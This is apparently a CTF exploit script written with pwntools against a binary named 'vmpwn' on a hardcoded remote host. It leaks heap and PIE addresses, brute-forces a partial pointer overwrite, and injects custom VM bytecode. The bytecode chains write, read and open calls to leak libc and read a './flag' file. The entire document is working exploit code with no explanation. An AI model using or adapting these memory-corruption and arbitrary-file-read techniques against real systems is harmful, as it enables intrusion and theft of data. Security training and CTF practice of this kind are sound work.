from pwn import *
context.arch = 'amd64'

TARGET = './vmpwn'
HOST = '207.246.82.76'
PORT = 8666

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def mov_r0_sp():
    return '\x10'

def mov_reg_imm(reg, val):
    return chr(reg + 0x11)+p64(val)

def push_reg(reg):
    return chr(reg + 0x44)
    
def pop_reg(reg):
    return chr(reg + 0x51)

def sub_sp(val):
    return chr(0x88)+p16(val)

def call_function(idx):
    # 0: read
    # 1: write
    # 2: puts
    # 3: free
    return chr(0x8f)+chr(idx)

while(1):
    r = start()
    r.sendafter('name:', 'A'*0xf0)
    r.recv(0xf0)
    leak = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
    dbg('leak')
    heap = leak - 0x50
    dbg('heap')
    
    target = p16(0xb84e) # 1/16
    r.sendafter('say:', 'B'*0x100+target)

    r.recvuntil('bye~\n')
    try:
        r.recvuntil('what is your')
        break
    except:
        r.close()

context.log_level = 'debug'
r.sendafter('name:', 'C'*0x100)
r.recv(0x100)
leak = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
dbg('leak')
pie = leak - 0x203851
bss = pie + 0x203000

if args.D:
    debug(r, [0xc8f])

payload = '\x77' * 0x100
payload += p64(heap + 0x2e70)

# write(1, bss+0x8e0, 8)
payload += mov_reg_imm(0, 1)
payload += mov_reg_imm(1, bss+0x8e0)
payload += mov_reg_imm(2, 0x8)
payload += call_function(1)

# read(0, bss+0x8e0+0x20, 0x10)
payload += mov_reg_imm(0, 0)
payload += mov_reg_imm(1, bss+0x8e0+0x20)
payload += mov_reg_imm(2, 0x10)
payload += call_function(0)

# open(bss+0x8e0+0x28, 0, 0)
payload += mov_reg_imm(0, bss+0x8e0+0x28)
payload += mov_reg_imm(1, 0)
payload += mov_reg_imm(2, 0)
payload += call_function(4)

# read(3, bss+0x8e0+0x40, 0x100)
payload += mov_reg_imm(0, 3)
payload += mov_reg_imm(1, bss+0x8e0+0x40)
payload += mov_reg_imm(2, 0x100)
payload += call_function(0)

# write(1, bss+0x8e0+0x40, 0x100)
payload += mov_reg_imm(0, 1)
payload += mov_reg_imm(1, bss+0x8e0+0x40)
payload += mov_reg_imm(2, 0x100)
payload += call_function(1)


r.sendafter('say:', payload)
r.recvuntil('bye~\n')
leak = u64(r.recv(8))
dbg('leak')
base = leak - 0xf7250
dbg('base')

libopen = base + 0xf7030
r.send(p64(libopen)+'./flag'.ljust(8, '\x00'))

r.interactive()
r.close()
